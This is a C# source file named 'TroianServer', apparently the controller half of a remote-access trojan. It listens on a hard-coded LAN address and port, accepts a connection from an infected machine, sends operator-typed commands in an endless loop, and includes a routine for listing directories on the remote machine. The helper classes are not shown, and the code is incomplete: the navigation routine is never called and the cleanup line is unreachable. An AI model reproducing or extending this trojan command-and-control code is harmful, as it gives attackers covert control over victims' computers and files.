using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace TroianServer
{
    class Program
    {
        static void Navigate(NetworkStream stream)
        {
            String path = Constants.NAVIGATE + "@" + Console.ReadLine();
            Messages.SendMessage(stream, path);
            String msn = Messages.ReceiveMessage(stream);
            Console.WriteLine(msn);
            if (msn.Equals("N"))
            {
                return;
            }

            int files = Int32.Parse(Messages.ReceiveMessage(stream));
            Messages.SendMessage(stream, "ACK");
            String[] dirs = new string[files];

            for (int i = 0; i < files; i++)
            {
                dirs[i] = Messages.ReceiveMessage(stream);
                Messages.SendMessage(stream, "ACK");
            }

            for (int i = 0; i < files; i++)
                Console.WriteLine(dirs[i]);
        }

        static void Main(string[] args)
        {
            TcpListener server = new TcpListener(System.Net.IPAddress.Parse("192.168.21.89"), 30021);
            TcpClient client;
            String username;
            
            try
            {
                server.Start();
                Console.WriteLine("Waiting for a connection...");
                client = server.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                username = Messages.ReceiveMessage(stream);
                Console.WriteLine("Connected!");

                while (true)
                {
                    String cmd = Console.ReadLine();

                    Messages.SendMessage(stream, cmd);
                }

                client.Close();
            }
            catch (Exception e) {
                Console.WriteLine(e.Message);
            }
        }
    }
}
